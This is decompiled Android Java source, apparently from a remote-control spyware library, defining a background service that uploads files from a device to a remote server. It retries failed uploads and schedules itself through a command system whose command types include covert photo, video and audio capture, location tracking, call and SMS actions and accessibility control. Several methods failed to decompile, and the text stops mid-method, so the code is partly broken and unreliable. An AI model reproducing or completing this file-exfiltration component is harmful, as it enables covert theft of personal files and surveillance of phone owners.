package com.hawkshaw.library.features.media.filecrud;

import O1.d;
import W2.e;
import W2.l;
import Y1.K;
import a3.j;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.PowerManager;
import androidx.lifecycle.C0269z;
import androidx.lifecycle.V;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import j3.f;
import o.C0769d;

public final class PushFileManagerService extends C0269z {
    public static final Companion Companion = new Companion((f) null);
    private static final int DELAY_BETWEEN_RETRY = 300000;
    private static final int FILE_SIZE_NETWORK_THRESHOLD = 104857600;
    private static final int PRIORITY_THRESHOLD = 5;
    private static final int SIZE_MULTIPLIER = 1024;
    private static final String TAG = "PushFileManagerService";
    private final e wakeLock$delegate = new l(new V(this, 8));

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    private final PowerManager.WakeLock getWakeLock() {
        return (PowerManager.WakeLock) this.wakeLock$delegate.getValue();
    }

    private final boolean hasWifiNetwork() {
        Object systemService = getSystemService(ConnectivityManager.class);
        K.l(systemService, "null cannot be cast to non-null type android.net.ConnectivityManager");
        ConnectivityManager connectivityManager = (ConnectivityManager) systemService;
        NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());
        if (networkCapabilities == null) {
            return false;
        }
        return networkCapabilities.hasTransport(1) || networkCapabilities.hasTransport(3);
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:18:0x0051  */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x008d A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x008e  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0098  */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x00bd  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0026  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object pushFile(com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity r13, a3.e r14) {
        /*
            r12 = this;
            boolean r0 = r14 instanceof O1.e
            if (r0 == 0) goto L_0x0013
            r0 = r14
            O1.e r0 = (O1.e) r0
            int r1 = r0.f1498H
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1498H = r1
            goto L_0x0018
        L_0x0013:
            O1.e r0 = new O1.e
            r0.<init>(r12, r14)
        L_0x0018:
            java.lang.Object r14 = r0.f1496F
            b3.a r8 = b3.C0298a.f4140D
            int r1 = r0.f1498H
            W2.y r9 = W2.y.f2418a
            r10 = 4
            r11 = 3
            r2 = 2
            r3 = 1
            if (r1 == 0) goto L_0x0051
            if (r1 == r3) goto L_0x0048
            if (r1 == r2) goto L_0x0040
            if (r1 == r11) goto L_0x003b
            if (r1 != r10) goto L_0x0033
            Y1.C0110h.P(r14)
            goto L_0x00e1
        L_0x0033:
            java.lang.IllegalStateException r13 = new java.lang.IllegalStateException
            java.lang.String r14 = "call to 'resume' before 'invoke' with coroutine"
            r13.<init>(r14)
            throw r13
        L_0x003b:
            Y1.C0110h.P(r14)
            goto L_0x00bc
        L_0x0040:
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity r13 = r0.f1495E
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r1 = r0.f1494D
            Y1.C0110h.P(r14)
            goto L_0x008f
        L_0x0048:
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity r13 = r0.f1495E
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r1 = r0.f1494D
            Y1.C0110h.P(r14)
            r14 = r1
            goto L_0x006e
        L_0x0051:
            Y1.C0110h.P(r14)
            com.hawkshaw.library.datalayer.room.AppDatabase r14 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r14 = r14.pushFileTaskDao()
            int r1 = r13.getId()
            r0.f1494D = r12
            r0.f1495E = r13
            r0.f1498H = r3
            java.lang.Object r14 = r14.incrementPriority(r1, r0)
            if (r14 != r8) goto L_0x006d
            return r8
        L_0x006d:
            r14 = r12
        L_0x006e:
            com.hawkshaw.library.datalayer.room.AppDatabase r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r1 = r1.pushFileTaskDao()
            int r3 = r13.getId()
            r0.f1494D = r14
            r0.f1495E = r13
            r0.f1498H = r2
            r6 = 2
            r7 = 0
            r4 = 0
            r2 = r3
            r3 = r4
            r5 = r0
            java.lang.Object r1 = com.hawkshaw.library.datalayer.room.files.PushFileTaskDao.DefaultImpls.setLastPushTimestamp$default(r1, r2, r3, r5, r6, r7)
            if (r1 != r8) goto L_0x008e
            return r8
        L_0x008e:
            r1 = r14
        L_0x008f:
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium r14 = r13.getMedium()
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium r2 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium.Tus
            r3 = 0
            if (r14 != r2) goto L_0x00bd
            java.io.File r2 = new java.io.File
            java.lang.String r14 = r13.getPath()
            r2.<init>(r14)
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r14 = r13.getSource()
            int r4 = r13.getBuffer()
            int r5 = r13.getId()
            r0.f1494D = r3
            r0.f1495E = r3
            r0.f1498H = r11
            r3 = r14
            r6 = r0
            java.lang.Object r13 = r1.pushFileTus(r2, r3, r4, r5, r6)
            if (r13 != r8) goto L_0x00bc
            return r8
        L_0x00bc:
            return r9
        L_0x00bd:
            java.io.File r2 = new java.io.File
            java.lang.String r14 = r13.getPath()
            r2.<init>(r14)
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r14 = r13.getSource()
            int r4 = r13.getBuffer()
            int r5 = r13.getId()
            r0.f1494D = r3
            r0.f1495E = r3
            r0.f1498H = r10
            r3 = r14
            r6 = r0
            java.lang.Object r13 = r1.pushFileGrpc(r2, r3, r4, r5, r6)
            if (r13 != r8) goto L_0x00e1
            return r8
        L_0x00e1:
            return r9
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.PushFileManagerService.pushFile(com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0055  */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x0104 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0105 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0030  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object pushFileGrpc(java.io.File r21, com.hawkshaw.library.datalayer.models.Command.FileRequest.Source r22, int r23, int r24, a3.e r25) {
        /*
            r20 = this;
            r0 = r21
            r1 = r24
            r2 = r25
            boolean r3 = r2 instanceof O1.f
            if (r3 == 0) goto L_0x001b
            r3 = r2
            O1.f r3 = (O1.f) r3
            int r4 = r3.f1503H
            r5 = -2147483648(0xffffffff80000000, float:-0.0)
            r6 = r4 & r5
            if (r6 == 0) goto L_0x001b
            int r4 = r4 - r5
            r3.f1503H = r4
            r4 = r20
            goto L_0x0022
        L_0x001b:
            O1.f r3 = new O1.f
            r4 = r20
            r3.<init>(r4, r2)
        L_0x0022:
            java.lang.Object r2 = r3.f1501F
            b3.a r5 = b3.C0298a.f4140D
            int r6 = r3.f1503H
            W2.y r7 = W2.y.f2418a
            r8 = 0
            r9 = 3
            r10 = 2
            r11 = 1
            if (r6 == 0) goto L_0x0055
            if (r6 == r11) goto L_0x0051
            if (r6 == r10) goto L_0x0043
            if (r6 != r9) goto L_0x003b
            Y1.C0110h.P(r2)
            goto L_0x0105
        L_0x003b:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0043:
            int r0 = r3.f1500E
            java.io.File r1 = r3.f1499D
            Y1.C0110h.P(r2)
            r19 = r1
            r1 = r0
            r0 = r19
            goto L_0x00f3
        L_0x0051:
            Y1.C0110h.P(r2)
            goto L_0x0089
        L_0x0055:
            Y1.C0110h.P(r2)
            boolean r2 = r21.isFile()
            if (r2 != 0) goto L_0x008a
            com.hawkshaw.library.logger.Logger r12 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r0 = r21.getPath()
            java.lang.String r2 = "PushFile: "
            java.lang.String r6 = " is not a file, aborting upload"
            java.lang.String r14 = i.C0528x.d(r2, r0, r6)
            r15 = 0
            r16 = 0
            java.lang.String r13 = "PushFileManagerService"
            r17 = 12
            r18 = 0
            com.hawkshaw.library.logger.Logger.e$default(r12, r13, r14, r15, r16, r17, r18)
            com.hawkshaw.library.datalayer.room.AppDatabase r0 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r0 = r0.pushFileTaskDao()
            r3.f1503H = r11
            java.lang.Object r0 = r0.delete(r1, r3)
            if (r0 != r5) goto L_0x0089
            return r5
        L_0x0089:
            return r7
        L_0x008a:
            com.hawkshaw.library.logger.Logger r11 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r2 = r21.getPath()
            boolean r6 = r20.hasWifiNetwork()
            long r12 = r21.length()
            r14 = 1048576(0x100000, float:1.469368E-39)
            long r14 = (long) r14
            long r12 = r12 / r14
            java.lang.StringBuilder r14 = new java.lang.StringBuilder
            java.lang.String r15 = "\n            PushFile: Upload starting... "
            r14.<init>(r15)
            r14.append(r2)
            java.lang.String r2 = ", \n            WiFi: "
            r14.append(r2)
            r14.append(r6)
            java.lang.String r2 = ", Size: "
            r14.append(r2)
            r14.append(r12)
            java.lang.String r2 = "MB\n        "
            r14.append(r2)
            java.lang.String r2 = r14.toString()
            java.lang.String r13 = X1.B.y(r2)
            java.lang.String r12 = "PushFileManagerService"
            r14 = 0
            r15 = 4
            r16 = 0
            com.hawkshaw.library.logger.Logger.v$default(r11, r12, r13, r14, r15, r16)
            r2 = r23
            byte[] r2 = new byte[r2]
            O1.i r6 = new O1.i
            r11 = r22
            r6.<init>(r0, r11, r2, r8)
            w3.e r2 = new w3.e
            r2.<init>((i3.p) r6)
            com.hawkshaw.library.datalayer.Injector$Companion r6 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r6 = r6.getInstance()
            com.hawkshaw.library.datalayer.network.service.FileService r6 = r6.getFileService()
            r3.f1499D = r0
            r3.f1500E = r1
            r3.f1503H = r10
            java.lang.Object r2 = r6.uploadFile(r2, r3)
            if (r2 != r5) goto L_0x00f3
            return r5
        L_0x00f3:
            w3.b r2 = (w3.C1066b) r2
            O1.h r6 = new O1.h
            r6.<init>(r0, r1)
            r3.f1499D = r8
            r3.f1503H = r9
            java.lang.Object r0 = r2.collect(r6, r3)
            if (r0 != r5) goto L_0x0105
            return r5
        L_0x0105:
            return r7
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.PushFileManagerService.pushFileGrpc(java.io.File, com.hawkshaw.library.datalayer.models.Command$FileRequest$Source, int, int, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x004f  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x00ee A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x012d A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x002d  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object pushFileTus(java.io.File r18, com.hawkshaw.library.datalayer.models.Command.FileRequest.Source r19, int r20, int r21, a3.e r22) {
        /*
            r17 = this;
            r0 = r21
            r1 = r22
            boolean r2 = r1 instanceof O1.j
            if (r2 == 0) goto L_0x0019
            r2 = r1
            O1.j r2 = (O1.j) r2
            int r3 = r2.f1521G
            r4 = -2147483648(0xffffffff80000000, float:-0.0)
            r5 = r3 & r4
            if (r5 == 0) goto L_0x0019
            int r3 = r3 - r4
            r2.f1521G = r3
            r3 = r17
            goto L_0x0020
        L_0x0019:
            O1.j r2 = new O1.j
            r3 = r17
            r2.<init>(r3, r1)
        L_0x0020:
            java.lang.Object r1 = r2.f1519E
            b3.a r4 = b3.C0298a.f4140D
            int r5 = r2.f1521G
            W2.y r6 = W2.y.f2418a
            r7 = 3
            r8 = 2
            r9 = 1
            if (r5 == 0) goto L_0x004f
            if (r5 == r9) goto L_0x004b
            if (r5 == r8) goto L_0x0044
            if (r5 != r7) goto L_0x003c
            Y1.C0110h.P(r1)     // Catch:{ Exception -> 0x0038 }
            goto L_0x012d
        L_0x0038:
            r0 = move-exception
            r10 = r0
            goto L_0x00ef
        L_0x003c:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0044:
            int r0 = r2.f1518D
            Y1.C0110h.P(r1)     // Catch:{ Exception -> 0x0038 }
            goto L_0x00de
        L_0x004b:
            Y1.C0110h.P(r1)
            goto L_0x0082
        L_0x004f:
            Y1.C0110h.P(r1)
            boolean r1 = r18.isFile()
            if (r1 != 0) goto L_0x0083
            com.hawkshaw.library.logger.Logger r10 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r1 = r18.getPath()
            java.lang.String r5 = "PushFile: "
            java.lang.String r7 = " is not a file, aborting upload"
            java.lang.String r12 = i.C0528x.d(r5, r1, r7)
            r13 = 0
            r14 = 0
            java.lang.String r11 = "PushFileManagerService"
            r15 = 12
            r16 = 0
            com.hawkshaw.library.logger.Logger.e$default(r10, r11, r12, r13, r14, r15, r16)
            com.hawkshaw.library.datalayer.room.AppDatabase r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r1 = r1.pushFileTaskDao()
            r2.f1521G = r9
            java.lang.Object r0 = r1.delete(r0, r2)
            if (r0 != r4) goto L_0x0082
            return r4
        L_0x0082:
            return r6
        L_0x0083:
            com.hawkshaw.library.logger.Logger r9 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r1 = r18.getPath()
            boolean r5 = r17.hasWifiNetwork()
            long r10 = r18.length()
            r12 = 1048576(0x100000, float:1.469368E-39)
            long r12 = (long) r12
            long r10 = r10 / r12
            java.lang.StringBuilder r12 = new java.lang.StringBuilder
            java.lang.String r13 = "\n            PushFileTus: Upload starting... "
            r12.<init>(r13)
            r12.append(r1)
            java.lang.String r1 = ", \n            WiFi: "
            r12.append(r1)
            r12.append(r5)
            java.lang.String r1 = ", Size: "
            r12.append(r1)
            r12.append(r10)
            java.lang.String r1 = "MB\n        "
            r12.append(r1)
            java.lang.String r1 = r12.toString()
            java.lang.String r11 = X1.B.y(r1)
            java.lang.String r10 = "PushFileManagerService"
            r12 = 0
            r13 = 4
            r14 = 0
            com.hawkshaw.library.logger.Logger.v$default(r9, r10, r11, r12, r13, r14)
            android.content.Context r1 = r17.getApplicationContext()     // Catch:{ Exception -> 0x0038 }
            java.lang.String r5 = "getApplicationContext(...)"
            Y1.K.m(r1, r5)     // Catch:{ Exception -> 0x0038 }
            r2.f1518D = r0     // Catch:{ Exception -> 0x0038 }
            r2.f1521G = r8     // Catch:{ Exception -> 0x0038 }
            r5 = r18
            r8 = r19
            r9 = r20
            java.lang.Object r1 = com.hawkshaw.library.features.media.filecrud.TusFileUploadKt.uploadFileTus(r1, r5, r8, r9, r2)     // Catch:{ Exception -> 0x0038 }
            if (r1 != r4) goto L_0x00de
            return r4
        L_0x00de:
            com.hawkshaw.library.datalayer.room.AppDatabase r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()     // Catch:{ Exception -> 0x0038 }
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r1 = r1.pushFileTaskDao()     // Catch:{ Exception -> 0x0038 }
            r2.f1521G = r7     // Catch:{ Exception -> 0x0038 }
            java.lang.Object r0 = r1.delete(r0, r2)     // Catch:{ Exception -> 0x0038 }
            if (r0 != r4) goto L_0x012d
            return r4
        L_0x00ef:
            r10.printStackTrace()
            com.hawkshaw.library.logger.Logger r7 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r0 = Y1.K.v0(r10)
            java.lang.String r1 = "PushFileTus: "
            java.lang.String r13 = r1.concat(r0)
            java.lang.String r12 = "PushFileManagerService"
            r14 = 0
            r15 = 4
            r16 = 0
            r11 = r7
            com.hawkshaw.library.logger.Logger.v$default(r11, r12, r13, r14, r15, r16)
            java.lang.String r0 = r10.getMessage()
            java.lang.Class r2 = r10.getClass()
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>(r1)
            r4.append(r0)
            java.lang.String r0 = ", "
            r4.append(r0)
            r4.append(r2)
            java.lang.String r9 = r4.toString()
            java.lang.String r8 = "PushFileManagerService"
            r11 = 0
            r12 = 8
            r13 = 0
            com.hawkshaw.library.logger.Logger.e$default(r7, r8, r9, r10, r11, r12, r13)
        L_0x012d:
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.PushFileManagerService.pushFileTus(java.io.File, com.hawkshaw.library.datalayer.models.Command$FileRequest$Source, int, int, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Code restructure failed: missing block: B:27:0x008d, code lost:
        r1 = (com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity) X2.o.T0((java.util.List) r1);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:28:0x0093, code lost:
        if (r1 != null) goto L_0x00d6;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:29:0x0095, code lost:
        if (r4 != false) goto L_0x00c3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:30:0x0097, code lost:
        r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb().pushFileTaskDao();
        r2.f1522D = r10;
        r2.f1526H = 3;
        r1 = r1.getTopTask(r2);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:31:0x00a8, code lost:
        if (r1 != r3) goto L_0x00ab;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:32:0x00aa, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:33:0x00ab, code lost:
        r2 = r10;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:35:0x00b3, code lost:
        if ((!((java.util.Collection) r1).isEmpty()) == false) goto L_0x00c2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x00b5, code lost:
        com.hawkshaw.library.logger.Logger.v$default(com.hawkshaw.library.logger.Logger.INSTANCE, TAG, "PushFile: Large file, wifi not available, aborting...,", false, 4, (java.lang.Object) null);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:37:0x00c2, code lost:
        r10 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:38:0x00c3, code lost:
        com.hawkshaw.library.logger.Logger.v$default(com.hawkshaw.library.logger.Logger.INSTANCE, TAG, "PushFile: No pending push file task", false, 4, (java.lang.Object) null);
        r2 = r10;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:39:0x00d1, code lost:
        r2.stopSelf();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:41:0x00da, code lost:
        if (r1.getPriority() <= 5) goto L_0x012d;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:42:0x00dc, code lost:
        r11 = com.hawkshaw.library.logger.Logger.INSTANCE;
        r4 = r1.getPriority();
        r7 = r1.getPath();
        com.hawkshaw.library.logger.Logger.e$default(r11, TAG, "PushFile: Re-tries(" + r4 + ") exhausted for " + r7 + ". Removing from PushFile list", (java.lang.Exception) null, false, 12, (java.lang.Object) null);
        r4 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb().pushFileTaskDao();
        r2.f1522D = r10;
        r2.f1526H = 4;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:43:0x011d, code lost:
        if (r4.delete(r1, r2) != r3) goto L_0x0120;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:44:0x011f, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:45:0x0120, code lost:
        r4 = r10;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:46:0x0121, code lost:
        r2.f1522D = null;
        r2.f1526H = 5;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:47:0x0129, code lost:
        if (r4.pushNextFile(r2) != r3) goto L_0x012c;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:48:0x012b, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:49:0x012c, code lost:
        return r5;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:51:0x013b, code lost:
        if ((java.lang.System.currentTimeMillis() - r1.getLastPushTimestamp()) >= 300000) goto L_0x0204;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:52:0x013d, code lost:
        com.hawkshaw.library.logger.Logger.v$default(com.hawkshaw.library.logger.Logger.INSTANCE, TAG, i.C0528x.d("PushFile: Last try was failed for ", r1.getPath(), ". Will retry after some time."), false, 4, (java.lang.Object) null);
        r50 = r17;
        r17 = new com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest(new com.hawkshaw.library.datalayer.models.Command(com.hawkshaw.library.datalayer.models.Command.CommandType.SyncPushFiles, 0, (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) null, (com.hawkshaw.library.datalayer.models.Command.FileRequest) null, (com.hawkshaw.library.datalayer.models.Command.FilesRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) null, (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) null, (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) null, (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) null, (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) null, (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) null, (com.hawkshaw.library.datalayer.models.Command.FlashRequest) null, (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) null, (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) null, (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) null, (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) null, (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) null, (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) null, (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) null, (com.hawkshaw.library.datalayer.models.Command.LoginRequest) null, (com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest) null, (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) null, (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) null, (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) null, (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) null, (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) null, 1073741822, (j3.f) null), java.lang.System.currentTimeMillis() + ((long) DELAY_BETWEEN_RETRY), 0, 44);
        r24 = new com.hawkshaw.library.datalayer.models.Command(com.hawkshaw.library.datalayer.models.Command.CommandType.ScheduleCommand, 0, (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) null, (com.hawkshaw.library.datalayer.models.Command.FileRequest) null, (com.hawkshaw.library.datalayer.models.Command.FilesRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) null, (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) null, (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) null, (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) null, (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) null, (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) null, (com.hawkshaw.library.datalayer.models.Command.FlashRequest) null, (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) null, (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) null, (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) null, (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) null, (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) null, (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) null, (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) null, (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) null, (com.hawkshaw.library.datalayer.models.Command.LoginRequest) null, r50, (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) null, (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) null, (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) null, (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) null, (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) null, 1056964606, (j3.f) null);
        r2.f1522D = r10;
        r2.f1526H = 6;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:53:0x01fc, code lost:
        if (com.hawkshaw.library.handler.CommandResolverKt.handleCommand$default(r24, (com.hawkshaw.library.handler.CommandSource) null, r2, 2, (java.lang.Object) null) != r3) goto L_0x01ff;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:54:0x01fe, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:55:0x01ff, code lost:
        r2 = r10;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:56:0x0200, code lost:
        r2.stopSelf();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:0x0203, code lost:
        return r5;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:58:0x0204, code lost:
        r2.f1522D = r10;
        r2.f1526H = 7;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:59:0x020d, code lost:
        if (r10.pushFile(r1, r2) != r3) goto L_0x0210;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:60:0x020f, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:61:0x0210, code lost:
        r4 = r10;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:62:0x0211, code lost:
        r2.f1522D = null;
        r2.f1526H = 8;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:63:0x021b, code lost:
        if (r4.pushNextFile(r2) != r3) goto L_0x021e;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:64:0x021d, code lost:
        return r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:65:0x021e, code lost:
        return r5;
     */
    /* JADX WARNING: Removed duplicated region for block: B:10:0x0033  */
    /* JADX WARNING: Removed duplicated region for block: B:11:0x0038  */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x003f  */
    /* JADX WARNING: Removed duplicated region for block: B:13:0x0046  */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x004b  */
    /* JADX WARNING: Removed duplicated region for block: B:15:0x0052  */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0058  */
    /* JADX WARNING: Removed duplicated region for block: B:17:0x0060  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x002b  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object pushNextFile(a3.e r86) {
        /*
            r85 = this;
            r0 = r85
            r1 = r86
            boolean r2 = r1 instanceof O1.k
            if (r2 == 0) goto L_0x0017
            r2 = r1
            O1.k r2 = (O1.k) r2
            int r3 = r2.f1526H
            r4 = -2147483648(0xffffffff80000000, float:-0.0)
            r5 = r3 & r4
            if (r5 == 0) goto L_0x0017
            int r3 = r3 - r4
            r2.f1526H = r3
            goto L_0x001c
        L_0x0017:
            O1.k r2 = new O1.k
            r2.<init>(r0, r1)
        L_0x001c:
            java.lang.Object r1 = r2.f1524F
            b3.a r3 = b3.C0298a.f4140D
            int r4 = r2.f1526H
            W2.y r5 = W2.y.f2418a
            r6 = 5
            r7 = 2
            r8 = 1
            r9 = 0
            switch(r4) {
                case 0: goto L_0x0060;
                case 1: goto L_0x0058;
                case 2: goto L_0x0058;
                case 3: goto L_0x0052;
                case 4: goto L_0x004b;
                case 5: goto L_0x0046;
                case 6: goto L_0x003f;
                case 7: goto L_0x0038;
                case 8: goto L_0x0033;
                default: goto L_0x002b;
            }
        L_0x002b:
            java.lang.IllegalStateException r1 = new java.lang.IllegalStateException
            java.lang.String r2 = "call to 'resume' before 'invoke' with coroutine"
            r1.<init>(r2)
            throw r1
        L_0x0033:
            Y1.C0110h.P(r1)
            goto L_0x021e
        L_0x0038:
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r4 = r2.f1522D
            Y1.C0110h.P(r1)
            goto L_0x0211
        L_0x003f:
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r2 = r2.f1522D
            Y1.C0110h.P(r1)
            goto L_0x0200
        L_0x0046:
            Y1.C0110h.P(r1)
            goto L_0x012c
        L_0x004b:
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r4 = r2.f1522D
            Y1.C0110h.P(r1)
            goto L_0x0121
        L_0x0052:
